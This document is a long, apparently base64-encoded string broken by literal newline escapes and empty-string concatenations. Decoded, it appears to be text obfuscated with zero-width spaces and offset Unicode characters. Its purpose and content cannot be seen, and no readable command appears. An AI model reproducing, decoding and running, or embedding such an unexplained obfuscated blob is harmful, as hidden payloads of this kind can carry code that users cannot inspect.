+KAq+KAi+KAsuKAi+KAu+KAi+KAu+KAi+KAsuKAi+KAsuKAi+KAu+KA\ni+KAu+KAi+KAu+KAi+KAuuKAi+KAq+KAi+KAt+KAi+KAtuKAi+KAq+KAi+KBvuKAi+KBouKAi+KBr+KA\ni+KAq+KAi+KAt+KAi+KAq+KAi+KAuuKAi+KAveKAi+KAueKAi+KAsuKAi+KAu+KAi+KAuuKAi+KAu+KA\ni+KAu+KAi+KAu+KAi+KAu+KAi+KAseKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KBueKAi+KBruKAi+KBv+KAi+KBvuKAi+KBueKAi+KBpeKAi+KAq+KA\ni+KAueKAi+KAu+KAi+KAuuKAi+KAv+KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBruKA\ni+KBp+KAi+KBouKAi+KBreKAi+KAq+KAi+KAuuKAi+KAsuKAi+KAu+KAi+KAu+KAi+KAu+KAi+KAu+KA\ni+KAu+KAi+KAu+KAi+KAu+KAi+KAu+""KAi+KAq+KAi+KAt+KAi+KAtuKAi+KAq+KAi+KBvuKAi+KBouKA\ni+KBr+KAi+KAq+KAi+KAt+KAi+KAq+KAi+KAueKAi+KAvuKAi+KAu+KAi+KAu+KAi+KAu+KAi+KAu+KA\ni+KAu+KAi+KAu+KAi+KAu+KAi+KAu+KAi+KAseKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBueKAi+KBruKAi+KBv+KAi+KBvuKAi+KBueKAi+KBpeKA\ni+KAq+KAi+KAueKAi+KAu+KAi+KAuuKAi+KAvuKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KBruKAi+KBp+KAi+KBouKAi+KBreKAi+KAq+KAi+KAueKAi+KAvuKAi+KAu+KAi+KAu+KAi+KAu+KA\ni+KAu+KAi+KAu+KAi+KAu+KAi+KAu+KAi+KAu+KAi+KAq+KAi+KAt+KAi+KAtuKAi+KAq+KAi+KBvuKA\ni+KBouKAi+KBr+KAi+KAq+KAi+KAt+KAi+KAq+KAi+KAuOKAi+KAvOKAi+KAuuKAi+KAuOKAi+KAveKA\ni+KAveKAi+KAs+KAi+KAvOKAi+KAs+KAi+KAveKAi+KAseKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBueKAi+KBruKAi+KBv+KAi+KBvuKAi+KBueKA\ni+KBpeKAi+KAq+KAi+KAueKAi+KAu+KAi+KAuuKAi+KAveKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KBruKAi+KBp+KAi+KBouKAi+KBreKAi+KAq+KAi+KAuOKAi+KAvOKAi+KAuuKAi+KAuOKA\ni+KAveKAi+KAveKAi+KAs+KAi+KAvOKAi+KAs+KAi+KAveKAi+KAq+KAi+KAt+KAi+KAtuKAi+KAq+KA\ni+KBvuKAi+KBouKAi+KBr+KAi+KAq+KAi+KAt+KAi+KAq+KAi+KAvuKAi+KAveKAi+KAsuKAi+KAsuKA\ni+KAvOKAi+KAs+KAi+KAvuKAi+KAueKAi+KAuuKAi+KAvOKAi+KAseKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBueKAi+KBruKAi+KBv+KAi+KBvuKA\ni+KBueKAi+KBpeKAi+KAq+KAi+KAueKAi+KAu+KAi+KAuuKAi+KAvOKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KBruKAi+KBp+KAi+KBouKAi+KBreKAi+KAq+KAi+KAvuKAi+KAveKAi+KAsuKA\ni+KAsuKAi+KAvOKAi+KAs+KAi+KAvuKAi+KAueKAi+KAuuKAi+KAvOKAi+KAq+""KAi+KAt+KAi+KAtuKA\ni+KAq+KAi+KBvuKAi+KBouKAi+KBr+KAi+KAq+KAi+KAt+KAi+KAq+KAi+KAs+KAi+KAvuKAi+KAu+KA\ni+KAvOKAi+KAsuKAi+KAv+KAi+KAu+KAi+KAveKAi+KAuOKAi+KAv+KAi+KAseKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBueKAi+KBruKAi+KBv+KA\ni+KBvuKAi+KBueKAi+KBpeKAi+KAq+KAi+KAueKAi+KAu+KAi+KAuuKAi+KAs+KAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KBruKAi+KBp+KAi+KBouKAi+KBreKAi+KAq+KAi+KAs+KAi+KAvuKA\ni+KAu+KAi+KAvOKAi+KAsuKAi+KAv+KAi+KAu+KAi+KAveKAi+KAuOKAi+KAv+KAi+KAq+KAi+KAt+KA\ni+KAtuKAi+KAq+KAi+KBvuKAi+KBouKAi+KBr+KAi+KAq+KAi+KAt+KAi+KAq+KAi+KAueKAi+KAuuKA\ni+KAueKAi+KAvuKAi+KAv+KAi+KAu+KAi+KAueKAi+KAsuKAi+KAs+KAi+KAuOKAi+KAv+KAi+KAseKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBueKA\ni+KBruKAi+KBv+KAi+KBvuKAi+KBueKAi+KBpeKAi+KAq+KAi+KAueKAi+KAu+KAi+KAuuKAi+KAsuKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBruKAi+KBp+KAi+KBuOKAi+KBruKAi+KAseKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBueKA\ni+KBruKAi+KBv+KAi+KBvuKAi+KBueKAi+KBpeKAi+KAq+KAi+KAqeKAi+KAueKAi+KAu+KAi+KAueKA\ni+KAu+KAi+KApuKAi+KAueKAi+KAu+KAi+KAueKAi+KAuOKAi+KAqeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBruKAi+KBs+KA\ni+KBqOKAi+KBruKAi+KBu+KAi+KBv+KAi+KAq+KAi+KBjuKAi+KBs+KAi+KBqOKAi+KBruKAi+KBu+KA\ni+KBv+KAi+KBouKAi+KBpOKAi+KBpeKAi+KAseKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KBueKAi+KBruKAi+KBv+KAi+KBvuKAi+KBueKAi+KBpeKAi+KAq+KAi+KArOKAi+KBo+KAi+KBo+KA\ni+KBo+KAi+KB""o+KAi+KArOKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KBr+KAi+KBruKAi+KBreKA\ni+KAq+KAi+KBguKAi+KBpeKAi+KBreKAi+KBpOKAi+KBiuKAi+KBqOKAi+KBqOKAi+KAo+KAi+KBvuKA\ni+KBuOKAi+KBruKAi+KBueKAi+KBpeKAi+KBquKAi+KBpuKAi+KBruKAi+KAp+KAi+KAq+KAi+KBrOKA\ni+KBrOKAi+KAouKAi+KAseKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBrOKAi+KBp+KAi+KBpOKAi+KBqeKAi+KBquKAi+KBp+KA\ni+KAq+KAi+KBv+KAi+KBpOKAi+KBv+KAi+KBquKAi+KBp+KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBueKAi+KBueKAi+KAtuKAi+KAq+KAi+KBouKAi+KBpeKA\ni+KBreKAi+KBpOKAi+KBouKAi+KBpeKAi+KBuOKAi+KBv+KAi+KBquKAi+KApeKAi+KBrOKAi+KBruKA\ni+KBv+KAi+KAo+KAi+KBvuKAi+KBuOKAi+KBruKAi+KBueKAi+KBpeKAi+KBquKAi+KBpuKAi+KBruKA\ni+KAp+KAi+KBsOKAi+KBtuKAi+KAouKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KBguKAi+KBr+KAi+KAq+KAi+KAtuKAi+KAq+KAi+KBueKAi+KBueKAi+KApeKA\ni+KBrOKAi+KBruKAi+KBv+KAi+KAo+KAi+KArOKAi+KBu+KAi+KBoOKAi+KArOKAi+KAp+KAi+KAq+KA\ni+KBheKAi+KBpOKAi+KBpeKAi+KBruKAi+KAouKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBreKAi+KBvuKAi+KBp+KAi+KBp+KA\ni+KBlOKAi+KBpeKAi+KBquKAi+KBpuKAi+KBruKAi+KAq+KAi+KAtuKAi+KAq+KAi+KBueKAi+KBueKA\ni+KApeKAi+KBrOKAi+KBruKAi+KBv+KAi+KAo+KAi+KArOKAi+KBreKAi+KBvuKAi+KBp+KAi+KBp+KA\ni+KBlOKAi+KBpeKAi+KBquKAi+KBpuKAi+KBruKAi+KArOKAi+KAp+KAi+KAq+KAi+KBheKAi+KBpOKA\ni+KBpeKAi+KBruKAi+KAouKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBreKAi+KBpOKAi+KBvOKAi+KBuOKAi+KAq+KAi+KAtuKA\ni+KAq+KAi+KBueKAi+KBueKAi+KApeKAi+KBrOKAi+KBruKAi+KBv+KAi+KAo+KAi+KArOKAi+KBreKA\ni+KBpOKAi+KBp+KAi+KBp+KAi+KBpOKAi+KBvOKAi+KBruKAi+KBueKAi+KBlOKAi+KBqOKAi+KBpOKA\ni+KBvuKAi+KBpeKAi+KBv+KAi+KArOKAi+KAp+KAi+KA""q+KAi+KBheKAi+KBpOKAi+KBpeKAi+KBruKA\ni+KAouKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KBreKAi+KBpOKAi+KBvOKAi+KBrOKAi+KAq+KAi+KAtuKAi+KAq+KAi+KBueKA\ni+KBueKAi+KApeKAi+KBrOKAi+KBruKAi+KBv+KAi+KAo+KAi+KArOKAi+KBreKAi+KBpOKAi+KBp+KA\ni+KBp+KAi+KBpOKAi+KBvOKAi+KBouKAi+KBpeKAi+KBrOKAi+KBlOKAi+KBqOKAi+KBpOKAi+KBvuKA\ni+KBpeKAi+KBv+KAi+KArOKAi+KAp+KAi+KAq+KAi+KBheKAi+KBpOKAi+KBpeKAi+KBruKAi+KAouKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KBu+KAi+KBu+KAi+KAq+KAi+KAtuKAi+KAq+KAi+KBueKAi+KBueKAi+KApeKAi+KBrOKA\ni+KBruKAi+KBv+KAi+KAo+KAi+KArOKAi+KBpuKAi+KBruKAi+KBr+KAi+KBouKAi+KBquKAi+KBlOKA\ni+KBqOKAi+KBpOKAi+KBvuKAi+KBpeKAi+KBv+KAi+KArOKAi+KAp+KAi+KAq+KAi+KBheKAi+KBpOKA\ni+KBpeKAi+KBruKAi+KAouKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBouKAi+KBuOKAi+KBm+KAi+KBueKAi+KBquKAi+KBouKA\ni+KBuOKAi+KBruKAi+KAq+KAi+KAtuKAi+KAq+KAi+KBueKAi+KBueKAi+KApeKAi+KBrOKAi+KBruKA\ni+KBv+KAi+KAo+KAi+KArOKAi+KBouKAi+KBuOKAi+KBlOKAi+KBu+KAi+KBueKAi+KBouKAi+KBveKA\ni+KBquKAi+KBv+KAi+KBruKAi+KArOKAi+KAp+KAi+KAq+KAi+KBheKAi+KBpOKAi+KBpeKAi+KBruKA\ni+KAouKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KBqeKAi+KBouKAi+KBpOKAi+KAq+KAi+KAtuKAi+KAq+KAi+KBueKAi+KBueKA\ni+KApeKAi+KBrOKAi+KBruKAi+KBv+KAi+KAo+KAi+KArOKAi+KBqeKAi+KBouKAi+KBpOKAi+KBrOKA\ni+KBueKAi+KBquKAi+KBu+KAi+KBo+KAi+KBsuKAi+KArOKAi+KAp+KAi+KAq+KAi+KBheKAi+KBpOKA\ni+KBpeKAi+KBruKAi+KAouKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBouKAi+KBuOKAi+KBlOKAi+KBveKAi+KBruKAi+KBueKA\ni+KBouKAi+KBreKAi+KBouKAi+KBruKAi+KBr+KAi+KAq+KAi+KAtuKAi+KAq+KAi+KBueKAi+KBueKA\ni+KApeKAi+KBrOKAi+KBruKAi+KBv+KAi+KAo+KAi+KArOKAi+KBouKAi+KBuOKAi+KBlOKAi+KBveKA\ni+KBruKAi+KBueKAi+KBouKAi+KBreKAi+KBouKAi+KBruKAi+KBr+KAi+KArOKAi+KAp+KAi+KAq+KA\ni+KBheKAi+KBpOKAi+KBpeKAi+KBruKAi+KAouKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KA""geKA\ni+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBqeKAi+KBouKAi+KBseKAi+KBseKA\ni+KAq+KAi+KAtuKAi+KAq+KAi+KBueKAi+KBueKAi+KApeKAi+KBrOKAi+KBruKAi+KBv+KAi+KAo+KA\ni+KArOKAi+KBouKAi+KBuOKAi+KBlOKAi+KBqeKAi+KBvuKAi+KBuOKAi+KBouKAi+KBpeKAi+KBruKA\ni+KBuOKAi+KBuOKAi+KArOKAi+KAp+KAi+KAq+KAi+KBheKAi+KBpOKAi+KBpeKAi+KBruKAi+KAouKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KBv+KAi+KBueKAi+KBsuKAi+KAseKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KBouKAi+KBreKAi+KAq+KAi+KAo+KAi+KBreKAi+KBpOKAi+KBvOKAi+KBuOKAi+KAq+KAi+KBquKA\ni+KBpeKAi+KBr+KAi+KAq+KAi+KBu+KAi+KBu+KAi+KAouKAi+KAseKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBouKAi+KBreKAi+KAq+KAi+KAo+KA\ni+KBouKAi+KBpeKAi+KBv+KAi+KAo+KAi+KBreKAi+KBpOKAi+KBvOKAi+KBuOKAi+KAouKAi+KAq+KA\ni+KAteKAi+KAtuKAi+KAq+KAi+KAuuKAi+KAu+KAi+KAq+KAi+KBquKAi+KBpeKAi+KBr+KAi+KAq+KA\ni+KBouKAi+KBpeKAi+KBv+KAi+KAo+KAi+KBu+KAi+KBu+KAi+KAouKAi+KAq+KAi+KAteKAi+KAtuKA\ni+KAq+KAi+KAueKAi+KAouKAi+KAseKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBpuKAi+KBruKAi+KBv+KA\ni+KBquKAi+KAq+KAi+KAtuKAi+KAq+KAi+KBn+KAi+KBueKAi+KBvuKAi+KBruKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBruKAi+KBp+KAi+KBuOKA\ni+KBruKAi+KAseKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBpuKAi+KBruKAi+KBv+KAi+KBquKAi+KAq+KA\ni+KAtuKAi+KAq+KAi+KBjeKAi+KBquKAi+KBp+KAi+KBuOKAi+KBruKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+""KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KBruKAi+KBp+KAi+KBuOKAi+KBruKAi+KAseKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBpuKAi+KBruKAi+KBv+KAi+KBquKA\ni+KAq+KAi+KAtuKAi+KAq+KAi+KBjeKAi+KBquKAi+KBp+KAi+KBuOKAi+KBruKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBruKA\ni+KBs+KAi+KBqOKAi+KBruKAi+KBu+KAi+KBv+KAi+KAseKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KBpuKAi+KBruKAi+KBv+KAi+KBquKAi+KAtuKAi+KBjeKAi+KBquKAi+KBp+KAi+KBuOKA\ni+KBruKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBv+KAi+KBpOKAi+KBv+KAi+KBquKA\ni+KBp+KAi+KAq+KAi+KAoOKAi+KAtuKAi+KAq+KAi+KAuuKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBuOKAi+KBv+KAi+KBruKA\ni+KBouKAi+KBpeKAi+KAq+KAi+KAtuKAi+KAq+KAi+KBreKAi+KArOKAi+KArOKAi+KArOKAi/CfkJji\ngIvwn5CF4oCL8J+QheKAi/CfkIDigIvigKvigIvwn5CK4oCL8J+Qk+KAi+KAq+KAi+KAqOKAi/CfkJni\ngIvwn5CY4oCL8J+Qj+KAi/CfkIPigIvwn5CG4oCL4oCr4oCL4oCr4oCL4oCB4oCLybTigIvUiuKAi9SK\n4oCL1IrigIvUiuKAi+K8seKAi92L4oCL4ryw4oCL1IrigIvUiuKAi9SK4oCL1IrigIvJteKAi+KAq+KA\ni+KAq+KAi+KAgeKAi/Cdk5DigIvigKvigIvigYXigIvigarigIvigabigIviga7igIvigKvigIvigKvi\ngIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigLHigIvigKvigIvttLXigIvigKvi\ngIvigbDigIviga3igIvigb7igIvigafigIvigafigIvigZTigIvigaXigIvigarigIvigabigIviga7i\ngIvigbbigIvigKvigIvttLTigIvigKvigIvigKvigIvigIHigIvwnZGv4oCL4oCr4oCL4oGe4oCL4oG4\n4oCL4oGu4oCL4oG54oCL4oGl4oCL4oGq4oCL4oGm4oCL4oGu4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr\n4oCL4oCx4oCL4oCr4oCL7bS14oCL4oCr4oCL4oGL4oCL4oGw4oCL4oG+4oCL4oG44oCL4oGu4oCL4oG5\n4oCL4oGl4oCL4oGq4oCL4oGm4oCL4oGu4oCL4oG24oCL4oCr4oCL7bS04o""CL4oCr4oCL4oCr4oCL4oCB\n4oCL8J2TrOKAi+KAq+KAi+KBjuKAi+KBpuKAi+KBquKAi+KBouKAi+KBp+KAi+KAq+KAi+KAq+KAi+KA\nq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAseKAi+KAq+KAi+20teKAi+KAq+KAi+KBsOKAi+KB\nvuKAi+KBuOKAi+KBruKAi+KBueKAi+KBpeKAi+KBquKAi+KBpuKAi+KBruKAi+KBtuKAi+KBi+KAi+KB\nrOKAi+KBpuKAi+KBquKAi+KBouKAi+KBp+KAi+KApeKAi+KBqOKAi+KBpOKAi+KBpuKAi+KAq+KAi+20\ntOKAi+KAq+KAi+KAq+KAi+KAgeKAi9mw4oCL7biE4oCL4oCr4oCL4oGZ4oCL4oGu4oCL4oG44oCL4oGu\n4oCL4oG/4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCx4oCL4oCr\n4oCL7bS14oCL4oCr4oCL4oGw4oCL4oG54oCL4oGu4oCL4oG44oCL4oG/4oCL4oCj4oCL4oG+4oCL4oG4\n4oCL4oGu4oCL4oG54oCL4oGl4oCL4oGq4oCL4oGm4oCL4oGu4oCL4oCi4oCL4oG24oCL4oCr4oCL7bS0\n4oCL4oCr4oCL4oCr4oCL4oCB4oCL8J2RruKAi+KAq+KAi+KBjeKAi+KBpOKAi+KBp+KAi+KBp+KAi+KB\npOKAi+KBvOKAi+KBruKAi+KBueKAi+KBuOKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAseKAi+KAq+KAi+20\nteKAi+KAq+KAi+KBsOKAi+KBreKAi+KBpOKAi+KBvOKAi+KBuOKAi+KBtuKAi+KAq+KAi+20tOKAi+KA\nq+KAi+KAq+KAi+KAgeKAi96q4oCL7biE4oCL4oCr4oCL4oGN4oCL4oGk4oCL4oGn4oCL4oGn4oCL4oGk\n4oCL4oG84oCL4oGi4oCL4oGl4oCL4oGs4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCx4oCL4oCr4oCL7bS1\n4oCL4oCr4oCL4oGw4oCL4oGt4oCL4oGk4oCL4oG84oCL4oGs4oCL4oG24oCL4oCr4oCL7bS04oCL4oCr\n4oCL4oCr4oCL4oCB4oCL8J2TluKAi+KAq+KAi+KBm+KAi+KBpOKAi+KBuOKAi+KBv+KAi+KBuOKAi+KA\nq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAseKAi+KAq+KAi+20teKAi+KA\nq+KAi+KBsOKAi+KBu+KAi+KBu+KAi+KBtuKAi+KAq+KAi+20tOKAi+KAq+KAi+KAq+KAi+KAgeKAi/Cd\np7XigIvigKvigIvigYnigIvigaLigIvigaTigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigLHigIvigKvigIvttLXigIvigKvigIvigbDigIviganigIvi\ngaLigIvigaTigIvigbbigIvigKvigIvttLTigIvigKvigIvigKvigIvigIHigIvwnYaf4oCL4oCr4oCL\n4oGe4oCL4oG44oCL4oGu4oCL4oG54oCL4oCr4oCL4oGC4oCL4oGP4oCL4oCr4oCL4oCr4oCL4oCr4oCL\n4oCr4oCL4oCr4oCL4oCx4oCL4oCr4oCL7bS14oCL4oCr4oCL4oGw4oCL4oGC4oCL4oGv4oCL4oG24oCL\n4oCr4oCL7bS04oCL4oCr4oCL4oCr4oCL4oCB4oCL8J2TjuKAi+KAq+KAi+KBkuKAi+KBruKAi+KBquKA\ni+KBueKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAseKA\ni+KAq+KA""i+20teKAi+KAq+KAi+KBsOKAi+KBr+KAi+KBquKAi+KBv+KAi+KBruKAi+KAo+KAi+KBguKA\ni+KBr+KAi+KAouKAi+KBtuKAi+KAq+KAi+20tOKAi+KAq+KAi+KAq+KAi+KAgeKAi8Sy4oCL7biE4oCL\n4oCr4oCL4oGG4oCL4oGu4oCL4oG/4oCL4oGq4oCL4oCr4oCL4oGC4oCL4oGl4oCL4oGt4oCL4oGk4oCL\n4oCr4oCL4oCr4oCL4oCr4oCL4oCx4oCL4oCr4oCL7bS14oCL4oCr4oCL4oGw4oCL4oGm4oCL4oGu4oCL\n4oG/4oCL4oGq4oCL4oG24oCL4oCr4oCL7bS04oCL4oCr4oCL4oCr4oCL4oCB4oCL8J2PqeKAi+KAq+KA\ni+KBieKAi+KBvuKAi+KBuOKAi+KBouKAi+KBpeKAi+KBruKAi+KBuOKAi+KBuOKAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAseKAi+KAq+KAi+20teKAi+KAq+KAi+KBsOKAi+KBqeKAi+KBouKAi+KBseKA\ni+KBseKAi+KBtuKAi+KAq+KAi+20tOKAi+KAq+KAi+KAq+KAi+KAgeKAi/CdlJzigIvigKvigIvigYLi\ngIvigaXigIvigbjigIvigb/igIvigarigIvigazigIvigbnigIvigarigIvigabigIvigKvigIvigKvi\ngIvigKvigIvigLHigIvigKvigIvigaPigIvigb/igIvigb/igIvigbvigIvigbjigIvigLHigIvigKTi\ngI